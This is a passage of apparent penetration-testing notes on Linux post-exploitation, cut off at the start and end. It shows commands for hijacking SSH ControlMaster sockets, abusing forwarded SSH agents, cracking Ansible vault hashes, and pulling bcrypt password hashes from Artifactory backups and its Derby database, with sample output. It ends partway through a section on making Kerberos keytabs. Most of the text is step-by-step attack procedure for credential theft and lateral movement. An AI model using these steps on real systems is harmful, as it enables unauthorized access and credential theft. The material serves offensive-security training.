<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ssh</span><span class="token plain"> kevin@web03</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-S</span><span class="token plain"> /home/user/.ssh/controlmaster/user</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">@linuxvictim</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">:22 user@linuxvictim</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>If logged in as root</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-S</span><span class="token plain"> /home/alice/.ssh/controlmaster</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">@alice@web03</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">:22 alice@web03</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ssh-agent-forwarding"><strong>SSH Agent Forwarding</strong><a href="#ssh-agent-forwarding" class="hash-link" aria-label="Direct link to ssh-agent-forwarding" title="Direct link to ssh-agent-forwarding" translate="no">​</a></h3>
<p><strong>Theory</strong> SSH-Agent stores a user&#x27;s private keys and answers signing requests so the user doesn&#x27;t retype passphrases. Agent forwarding lets an intermediate host proxy those signing requests back to the origin client, enabling the forwarded session to SSH onward without the private key ever leaving the client. In an attack, an adversary on the intermediate machine can use the forwarded agent (or coerce it via crafted requests) to authenticate to downstream systems if the attacker can reach them — making agent-forwarding a powerful lateral-movement vector. Practical requirements: a keypair on the originating machine and the public key installed on the intermediate and destination hosts (e.g., <code>ssh-copy-id -i ~/.ssh/id_rsa.pub user@host</code>).</p>
<p><strong>Steps</strong> A -&gt; B -&gt; C: A has a session on B, and A&#x27;s private key can access to both B and C. On B to access C. Normal user.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ssh</span><span class="token plain"> alice@web03</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>Privileged User</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token assign-left variable environment constant" style="color:#36acaa">SSH_AUTH_SOCK</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/tmp/ssh-xxx ssh-add </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable environment constant" style="color:#36acaa">SSH_AUTH_SOCK</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/tmp/ssh-xxx </span><span class="token function" style="color:#d73a49">ssh</span><span class="token plain"> alice@web03</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable environment constant" style="color:#36acaa">SSH_AUTH_SOCK</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/tmp/ssh-7OgTFiQJhL/agent.16380 </span><span class="token function" style="color:#d73a49">ssh</span><span class="token plain"> user@linuxvictim</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ansible"><strong>Ansible</strong><a href="#ansible" class="hash-link" aria-label="Direct link to ansible" title="Direct link to ansible" translate="no">​</a></h3>
<p><strong>Playbook Possibilities</strong></p>
<ul>
<li class="">Node hosts: <code>/etc/ansible/hosts</code></li>
<li class="">Check the folder <code>/etc/ansible</code></li>
<li class="">Execute commands on node servers</li>
</ul>
<p><strong>Crack Vaults</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Find a way to download the vault.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Convert the hash, for example</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ansible2john root.enc </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> vault.hash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Crack the vault</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">john </span><span class="token parameter variable" style="color:#36acaa">--wordlist</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">rockyou.txt vault.hash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Go back to the server and use the password to decrypt the vault</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> the_vault </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> ansible-vault decrypt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Retrieve credentials of node servers from playbook</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ansible2john web.yaml </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> ansible_web_hash.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hashcat </span><span class="token parameter variable" style="color:#36acaa">--wordlist</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/usr/share/wordlists/rockyou.txt </span><span class="token parameter variable" style="color:#36acaa">--force</span><span class="token plain"> --hash-type</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">16900</span><span class="token plain"> ansible_web_hash.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> pw.txt </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> ansible-vault decrypt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Sensitive data</strong></p>
<ul>
<li class="">Playbook contains a command, the command contains plaintext credential, like <code>/opt/playbooks/mysql.yml</code></li>
<li class="">Check the folder <code>/opt/playbooks/</code> and <code>/var/log/syslog</code> trying to find sensible information.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="artifactory-jfrog"><strong>Artifactory (JFrog)</strong><a href="#artifactory-jfrog" class="hash-link" aria-label="Direct link to artifactory-jfrog" title="Direct link to artifactory-jfrog" translate="no">​</a></h3>
<p><strong>Check Location</strong> Binary Repository Manager - Port 8082</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ps</span><span class="token plain"> aux </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> artifactory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Possible Attacks</strong></p>
<ul>
<li class=""><strong>Check existing files and user interactions</strong> like creation, download, etc.</li>
<li class=""><strong>Delivery malicious file</strong> (With user interaction)</li>
<li class=""><strong>Database backup contains credential</strong>: <code>/opt/jfrog/artifactory/var/backup/access</code>, for example:</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Check the files found</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> /opt/jfrog/artifactory/var/backup/access</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> access.backup.20200730120454.json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;username&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;developer&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;firstName&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> null,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;lastName&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> null,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;email&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;developer@corp.local&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;realm&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;internal&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;status&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;enabled&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;lastLoginTime&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;lastLoginIp&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> null,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;password&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;bcrypt</span><span class="token string variable" style="color:#36acaa">$$</span><span class="token string" style="color:#e3116c">2a</span><span class="token string variable" style="color:#36acaa">$08</span><span class="token string variable" style="color:#36acaa">$f8KU00P7kdOfTYFUmes1</span><span class="token string" style="color:#e3116c">/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;allowedIps&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;*&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;created&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1591715957889</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;modified&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1591715957889</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;failedLoginAttempts&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;statusLastModified&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1591715957889</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;passwordLastModified&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1591715957889</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;customData&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token string" style="color:#e3116c">&quot;updatable_profile&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;value&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;true&quot;</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;sensitive&quot;</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Copy the bcrypt hash part to a file and try to crack it</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">$2a</span><span class="token string variable" style="color:#36acaa">$08</span><span class="token string variable" style="color:#36acaa">$f8KU00P7kdOfTYFUmes1</span><span class="token string" style="color:#e3116c">/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> derbyhash.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> john derbyhash.txt </span><span class="token parameter variable" style="color:#36acaa">--wordlist</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/usr/share/wordlists/rockyou.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ul>
<li class=""><strong>Compromise the Database</strong></li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 1. Copy the database</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mkdir</span><span class="token plain"> /tmp/hackeddb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">cp</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-r</span><span class="token plain"> /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">755</span><span class="token plain"> /tmp/hackeddb/derby</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">rm</span><span class="token plain"> /tmp/hackeddb/derby/*.lck</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 2. Run the Derby connection utility</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> /opt/jfrog/artifactory/app/third-party/java/bin/java </span><span class="token parameter variable" style="color:#36acaa">-jar</span><span class="token plain"> /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ij version </span><span class="token number" style="color:#36acaa">10.15</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ij</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> connect </span><span class="token string" style="color:#e3116c">&#x27;jdbc:derby:/tmp/hackeddb/derby&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ij</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 3. Run your actions, like listing users</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ij</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> * from access_users</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">USER_ID </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">USERNAME </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">PASSWORD </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">ALLOWED_IPS </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">CREATED </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">MODIFIED </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">FIRSTNAME </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">LASTNAME </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">EMAIL </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">REALM </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">STATUS </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">LAST_LOGIN_TIME </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">LAST_LOGIN_IP </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">FAILED_ATTEMPTS </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">STATUS_LAST_MODIFIED</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> PASSWORD_LAST_MODIF</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">admin </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">bcrypt</span><span class="token variable" style="color:#36acaa">$$</span><span class="token plain">2a</span><span class="token variable" style="color:#36acaa">$08</span><span class="token variable" style="color:#36acaa">$3gNs9Gm4wqY5ic</span><span class="token plain">/2/kFUn.S/zYffSCMaGpshXj/f/X0EMK.ErHdp2 </span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1 </span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">1591715727140</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">1591715811546</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">NULL </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">NULL </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">NULL </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">internal </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">enabled </span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">1596125074382</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.118.5 </span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">1591715811545</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">1591715811545</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">developer </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">bcrypt</span><span class="token variable" style="color:#36acaa">$$</span><span class="token plain">2a</span><span class="token variable" style="color:#36acaa">$08</span><span class="token variable" style="color:#36acaa">$f8KU00P7kdOfTYFUmes1</span><span class="token plain">/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">* </span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">1591715957889</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">1591715957889</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">NULL </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">NULL </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">developer@corp.local </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">internal </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">enabled </span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">NULL </span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">1591715957889</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token number" style="color:#36acaa">1591715957889</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> rows selected</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ij</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="kerberos"><strong>Kerberos</strong><a href="#kerberos" class="hash-link" aria-label="Direct link to kerberos" title="Direct link to kerberos" translate="no">​</a></h3>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="stealing-keytab-files"><strong>Stealing Keytab Files</strong><a href="#stealing-keytab-files" class="hash-link" aria-label="Direct link to stealing-keytab-files" title="Direct link to stealing-keytab-files" translate="no">​</a></h3>
<p><strong>Theory</strong> If we have access to an user and its password, we can create tickets for it and then use that ticket to connect to AD services or servers. Keytab files store a Kerberos principal name and encrypted keys, allowing scripts or users to authenticate to Kerberos-enabled resources without needing to enter a password. They&#x27;re often used in automated tasks, such as cron jobs, to enable secure access to services like MSSQL. By reviewing cron configurations and scripts, one can identify which keytabs are in use and which users they belong to. A keytab can be created with <strong>ktutil</strong> by adding entries for a user, specifying encryption, entering the password, writing the keytab file, and exiting the utility.</p>
<p><strong>Steps</strong></p>
<ol>
<li class=""><strong>Create the keytab file</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ktutil</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ktutil:  addent </span><span class="token parameter variable" style="color:#36acaa">-password</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> administrator@CORP1.COM </span><span class="token parameter variable" style="color:#36acaa">-k</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-e</span><span class="token plain"> rc4-hmac</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> administrator@CORP1.COM:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ktutil:  wkt /tmp/administrator.keytab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ktutil:  quit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">Load the keytab file</li>
</ol>
